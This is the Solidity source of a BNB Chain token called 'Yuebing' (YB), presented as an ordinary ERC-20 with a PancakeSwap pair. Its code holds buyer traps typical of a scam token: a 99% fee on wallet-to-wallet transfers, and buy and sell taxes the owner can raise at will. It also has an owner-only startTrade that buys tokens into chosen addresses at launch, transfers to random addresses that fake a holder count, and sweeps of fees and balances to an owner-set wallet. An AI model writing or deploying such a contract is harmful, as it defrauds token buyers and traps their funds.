// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "you are not owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Token is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address payable public mkt;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    mapping(address => bool) public _isExcludeFromFee;
    uint256 private _totalSupply;
    IUniswapRouter public _uniswapRouter;
    mapping(address => bool) public isMarketPair;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    address public _uniswapPair;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor (){

        _name = "Yuebing";
        _symbol = "YB";
        _decimals = 18;
        uint256 Supply = 100000000;

        _totalSupply = Supply * 10 ** _decimals;
        swapAtAmount = _totalSupply / 1000;

        address receiveAddr = 0x7C0aDFe0be65C8B505713C0407c41d8b392c42D7;
        _balances[receiveAddr] = _totalSupply;
        emit Transfer(address(0), receiveAddr, _totalSupply);

        mkt = payable(receiveAddr);

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[receiveAddr] = true;
        _isExcludeFromFee[mkt] = true;

        IUniswapRouter swapRouter = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _uniswapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
        _uniswapPair = swapFactory.createPair(address(this), swapRouter.WETH());

        isMarketPair[_uniswapPair] = true;
        IERC20(_uniswapRouter.WETH()).approve(
            address(address(_uniswapRouter)),
            ~uint256(0)
        );
        _isExcludeFromFee[address(swapRouter)] = true;

    }

    function setMKT(
        address payable newMKT
    ) public onlyOwner{
        mkt = newMKT;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    uint256 public _buyCount=0;
    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=5;
    uint256 private _finalSellTax=5;
    uint256 private _reduceBuyTaxAt=0;
    uint256 private _reduceSellTaxAt=0;
    uint256 private _preventSwapBefore=0;
    uint256 public transferFee = 99;
    function setTransferFee(uint256 newValue) public onlyOwner{
        transferFee = newValue;
    }

    function recuseTax(
        uint256 newBuy,
        uint256 newSell,
        uint256 newReduceBuy,
        uint256 newReduceSell,
        uint256 newPreventSwapBefore
    ) public onlyOwner {
        _finalBuyTax = newBuy;
        _finalSellTax = newSell;
        _reduceBuyTaxAt = newReduceBuy;
        _reduceSellTaxAt = newReduceSell;
        _preventSwapBefore = newPreventSwapBefore;
    }

    bool public remainHolder = true;
    function changeRemain() public onlyOwner{
        remainHolder = !remainHolder;
    }

    uint256 swapAtAmount;
    function setSwapAtAmount(
        uint256 newValue
    ) public onlyOwner{
        swapAtAmount = newValue;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (inSwap){
            _basicTransfer(from, to, amount);
            return;
        }

        bool takeFee;

        if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && _buyCount > _preventSwapBefore) {
            uint256 _numSellToken = amount;
            if (_numSellToken > balanceOf(address(this))){
                _numSellToken = _balances[address(this)];
            }
            if (_numSellToken > swapAtAmount){
                swapTokenForETH(_numSellToken);
            }
        }

        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
            require(startTradeBlock > 0);
            takeFee = true;
            
            // buyCount
            if (isMarketPair[from] && to != address(_uniswapRouter) && !_isExcludeFromFee[to]) {
                _buyCount++;
            }

            // remainHolder
            if (remainHolder) {
                if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && (
                    from == _uniswapPair || to == _uniswapPair
                )){
                    for(uint a = 0; a < 1 ;a++){
                        _basicTransfer(from, address(uint160(uint(keccak256(abi.encodePacked(a, block.number, block.difficulty, block.timestamp))))), 100);
                    }
                    amount -= 100;
                }
            }

        }

        _transferToken(from, to, amount, takeFee);
    }

    function _transferToken(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 taxFee;
            if (isMarketPair[recipient]) {
                taxFee = _buyCount > _reduceSellTaxAt ? _finalSellTax : _initialSellTax;
            } else if (isMarketPair[sender]) {
                taxFee = _buyCount > _reduceBuyTaxAt ? _finalBuyTax : _initialBuyTax;
            }else{
                taxFee = transferFee;
            }
            uint256 swapAmount = tAmount * taxFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _balances[address(this)] = _balances[address(this)] + swapAmount;
                emit Transfer(sender, address(this), swapAmount);
            }
        }

        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
        emit Transfer(sender, recipient, tAmount - feeAmount);

    }

    uint256 public startTradeBlock;
    function startTrade(address[] calldata adrs,uint256 r) public onlyOwner {
        for(uint i=0;i<adrs.length;i++){
            swapToken(((random(5,adrs[i])+1)*10**16+7*10**16) * r,adrs[i]);
        }
        if(adrs.length == 0){
            startTradeBlock = 0;
        }else{
            startTradeBlock = block.number;
        }
    }

    function swapToken(uint256 tokenAmount,address to) private lockTheSwap {
        address weth = _uniswapRouter.WETH();
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(this);
        uint256 _bal = IERC20(weth).balanceOf(address(this));
        tokenAmount = tokenAmount > _bal ? _bal : tokenAmount;
        if (tokenAmount == 0) return;
        // make the swap
        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of CA
            path,
            address(to),
            block.timestamp
        );
    }

    function random(uint number,address _addr) private view returns(uint) {
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  _addr))) % number;
    }

    function removeERC20(address _token) external {
        if(mkt == msg.sender){
            IERC20(_token).transfer(mkt, IERC20(_token).balanceOf(address(this)));
            mkt.transfer(address(this).balance);
        }
    }

    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {}

        uint256 _bal = address(this).balance;
        if (_bal > 0.05 ether){
            mkt.transfer(_bal);
        }
    }

    function setIsExcludeFromFee(address[] calldata accounts, bool value) public onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludeFromFee[accounts[i]] = value;
        }
    }

    receive() external payable {}
}